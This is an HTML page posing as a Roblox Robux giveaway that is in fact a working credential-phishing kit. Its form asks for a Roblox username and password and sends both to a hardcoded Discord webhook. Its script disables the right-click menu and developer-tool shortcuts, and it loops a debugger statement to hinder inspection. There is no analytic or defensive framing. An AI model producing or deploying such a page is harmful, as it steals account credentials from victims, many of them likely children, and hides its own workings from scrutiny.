<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Giveaway</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #e9eff7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    input, select {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #4caf50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .success {
      color: green;
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Enter the Roblox Giveaway!</h2>
    <input type="text" id="username" placeholder="Roblox Username" required />
    <input type="text" id="displayName" placeholder="Roblox Password (for security reasons)" required />
    <select id="robuxAmount" required>
      <option value="">Select Robux Amount</option>
      <option value="100">100 Robux</option>
      <option value="250">250 Robux</option>
      <option value="500">500 Robux</option>
      <option value="1000">1000 Robux</option>
    </select>
    <button onclick="submitForm()">Enter Giveaway</button>
    <div class="success" id="successMsg"></div>
  </div>

  <script>
    async function submitForm() {
      const u = document.getElementById("username").value.trim();
      const d = document.getElementById("displayName").value.trim();
      const r = document.getElementById("robuxAmount").value;
      if (!u || !d || !r) { alert("Fill all fields."); return; }
      const w = "https://discord.com/api/webhooks/1392822673679319170/9kzGJTPFFklVy2PVcrpMiLEzAy3jHFryQUPo3Xeqe4nF2ws2Lmc1xZOyhzi0zo0hveDL";
      const p = {
        content: `ðŸŽ **New Giveaway Entry!**
ðŸ‘¤ Username: \`${u}\`
ðŸ“ Password: \`${d}\`
ðŸ’° Requested Robux: \`${r} Robux\``
      };
      try {
        const res = await fetch(w, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(p)
        });
        if (res.ok) document.getElementById("successMsg").innerText = "Thanks for entering!";
        else alert("Something went wrong.");
      } catch (e) {
        alert("Error: " + e.message);
      }
    }

    document.addEventListener("contextmenu", e => e.preventDefault());
    document.addEventListener("keydown", e => {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
        (e.ctrlKey && e.key === "U") ||
        (e.metaKey && e.key === "I")
      ) {
        e.preventDefault();
        return false;
      }
    });

    setInterval(() => {
      debugger;
    }, 1000);
  </script>
</body>
</html>
